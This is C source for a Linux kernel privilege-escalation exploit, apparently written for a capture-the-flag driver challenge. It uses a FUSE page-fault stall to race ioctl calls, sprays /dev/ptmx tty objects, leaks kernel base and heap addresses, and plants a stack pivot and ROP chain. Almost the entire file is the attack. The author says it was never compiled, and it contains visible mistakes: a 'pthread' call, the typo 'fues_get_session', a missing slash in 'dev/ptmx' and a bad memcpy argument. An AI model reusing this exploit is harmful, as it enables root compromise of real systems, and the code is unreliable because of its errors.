/* unfortunately I couldn't compile the code with my current setup, but it should work */

#define _GNU_SOURCE
#define FUSE_USE_VERSION 29
#include <assert.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include "fuse.h"
#include "exp.h"
uint64_t payload[1024 / sizeof(uint64_t)];
static int open_callback(const char *path, struct fuse_file_info *fi){

    return 0;
}
int fd;
int spray[0x10];
static int read_callback(const char *path, char *buf, size_t size, off_t offset, struct fuse_file_info *fi){ // triggered before every page fault caused by copy_from_user/copy_to_user  
    static int fault_count = 0;
    if(strcmp(path, "/pwn") == 0){
        if(fault_count++ == 2){for(int i = 0; i < 0x100; i++){ioctl_add(payload, 1024);} // ?
        ioctl_del(id);
        for(int i = 0; i < 0x10; i++){if((spray[i]=open("dev/ptmx", O_RDWR | O_NOCTTY)) < 0){ERROR("failed to open the file..")}}

        }
    return 0;
    }
}

static struct fuse_operations fops = {
    .open = open_callback,
    .read = read_callback,
};
cpu_set_t cpu_0;
int fuse_ready = 0;
void *fuse_create(void *arg){
    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    struct fuse_chan *chan;
    struct fuse *fuse;
    if(mkdir("/tmp/unknownd4", 0777)){puts("Error: failed to open a FUSE directory.."); exit(1);}
    if(!(chan = fuse_mount("/tmp/unknownd4", &args))){puts("Error: failed to mount to the specified FUSE directory.."); exit(1);}
    if(!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL))){fuse_unmount("/tmp/unknownd4", chan); puts("Error: failed to create a new FUSE.."); exit(1);}
    
    if(sched_setaffinity(0, sizeof(cpu_set_t), NULL)){ERROR("failed to set the cpu..")}
    
    /*what?*/
    fuse_set_signal_handlers(fues_get_session(fuse));
    fuse_ready = 1;
    fuse_loop_mt(fuse);
    fuse_unmount("/tmp/unknownd4", chan);
    return NULL;
}

int main(int argc, char **argv){
    save_user_state();
    CPU_ZERO(&cpu_0);
    CPU_SET(0, &cpu_0);
    if(sched_setaffinity(0, sizeof(cpu_set_t), NULL)){ERROR("failed to set the cpu..")}
    pthread_t th;
    pthread(&th, NULL, fuse_create, NULL);
    while(!fuse_ready); // wait until FUSE is setup
    
    uint64_t leak[0x28 / sizeof(uint64_t)], leak2[1024 / sizeof(uint64_t)];
    int fuse_fd;
    if((fd=open(DEVICE_PATH, O_RDWR)) < 0){ERROR("failed to open the vulnerable device..")}
    if((fuse_fd = open("/tmp/unknownd4/pwn", O_RDWR)) < 0){ERROR("failed to open FUSE..")}
    
    if((id=ioctl_add("unknownd4", 1024))==-EINVAL){ERROR("the device failed to create a new blob list..")}
    if(ioctl_get(id, (char *)leak, 0x24) == -EINVAL){ERROR("failed to ioctl CMD_GET..")}
    uint64_t kbase = leak[3] - 0x0c3c3c0;
    printf("kernel base address: %p\n", kbase);
    for(int i = 0; i < 0x10; i++){close(spray[i]);}
   
    if((id=ioctl_add("unknownd4", 1024))==-EINVAL){ERROR("the device failed to create a new blob list..")}
    if(ioctl_get(id, (char *)leak2, 1024) == -EINVAL){ERROR("failed to ioctl CMD_GET..")}
    uint64_t kheap = leak2[7] - 0x38;
    printf("kernel heap address: %p\n", kheap);
    for(int i = 0; i < 0x10; i++){close(spray[i]);}

    memcpy(payload, leak2, 1024);
    payload[0] = 0x0000000100005401;
    payload[2] = leak[2];
    payload[3] = kheap;
    payload[12] = push_rdx_cmp_eax_pop_rsp_rbp_ret;
    memcpy(payload[513], create_rop_chain(kbase), 0x100);

    if((id=ioctl_add("unknownd4", 1024))==-EINVAL){ERROR("the device failed to create a new blob list..")}
    if(ioctl_set(id, (char *)payload, 1024) == -EINVAL){ERROR("failed to ioctl CMD_SET..")}
    for(int i = 0; i < 0x10; i++){ioctl(spray[i], 0, kheap+0x100/*rdx*/);}
    
    return 0;
}